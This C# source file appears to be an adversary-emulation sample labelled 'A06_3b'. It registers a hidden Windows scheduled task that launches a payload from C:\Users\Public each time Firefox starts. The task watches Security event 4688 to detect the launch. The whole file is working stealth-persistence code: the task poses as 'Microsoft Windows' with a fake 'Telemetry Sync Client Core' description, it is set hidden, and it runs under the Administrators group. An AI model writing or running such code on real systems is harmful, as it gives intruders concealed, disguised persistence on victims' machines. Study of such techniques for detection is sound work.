using System;
using System.IO;
using System.Runtime.InteropServices;

namespace A06_3b_event_trigger_schtask_persist
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string payloadPath = @"C:\Users\Public\A06_3b_SampleApp.exe";
                Console.WriteLine($"[*] Debug: Checking payload path: '{payloadPath}'...");
                if (!File.Exists(payloadPath))
                {
                    Console.WriteLine($"[-] PRE-REGISTRATION ERROR: Target payload binary was not found at '{payloadPath}'.");
                    return;
                }

#pragma warning disable CA1416
                Type? taskSchedulerType = Type.GetTypeFromProgID("Schedule.Service");
#pragma warning restore CA1416
                if (taskSchedulerType == null) return;

                dynamic? ts = Activator.CreateInstance(taskSchedulerType);
                if (ts == null) return;
                ts.Connect();

                dynamic rootFolder = ts.GetFolder("\\");

                try
                {
                    rootFolder.DeleteTask("A06_3b_EventTriggerTask", 0);
                }
                catch (COMException) { /* Ignore */ }

                dynamic taskDef = ts.NewTask(0);

                dynamic regInfo = taskDef.RegistrationInfo;
                regInfo.Author = "Microsoft Windows";
                regInfo.Description = "Telemetry Sync Client Core";

                dynamic triggers = taskDef.Triggers;
                dynamic trigger = triggers.Create(0); // TASK_TRIGGER_EVENT = 0

                // Strict XML structural format matching Windows exact parser expectations
                string subscriptionXml = @"<QueryList><Query Id='0' Path='Security'><Select Path='Security'>*[System[EventID=4688]] and *[EventData[Data[@Name='NewProcessName']='C:\Program Files\Mozilla Firefox\firefox.exe']]</Select></Query></QueryList>";

                trigger.Id = "FirefoxLaunchTrigger";
                trigger.Subscription = subscriptionXml;
                trigger.Enabled = true;

                dynamic actions = taskDef.Actions;
                dynamic action = actions.Create(0); // TASK_ACTION_EXEC = 0
                action.Path = payloadPath;

                dynamic settings = taskDef.Settings;
                settings.DisallowStartIfOnBatteries = false;
                settings.StopIfGoingOnBatteries = false;
                settings.Hidden = true;

                Console.WriteLine("[*] Debug: Invoking RegisterTaskDefinition via COM interface...");

                // CRITICAL ADJUSTMENT: Changed execution context configuration profile
                dynamic registeredTask = rootFolder.RegisterTaskDefinition(
                    "A06_3b_EventTriggerTask",
                    taskDef,
                    6,                             // TASK_CREATE_OR_UPDATE
                    "Builtin\\Administrators",     // Group Context with Security Log visibility privileges
                    Type.Missing,
                    4,                             // TASK_LOGON_GROUP (Allows token execution permissions)
                    Type.Missing
                );

                Console.WriteLine("[+] Successfully registered C# application-triggered stealth task!");
            }
            catch (COMException ex)
            {
                Console.WriteLine($"[-] COM Error registering task: {ex.Message} (HRESULT: 0x{ex.HResult:X8})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error registering task: {ex.Message}");
            }
        }
    }
}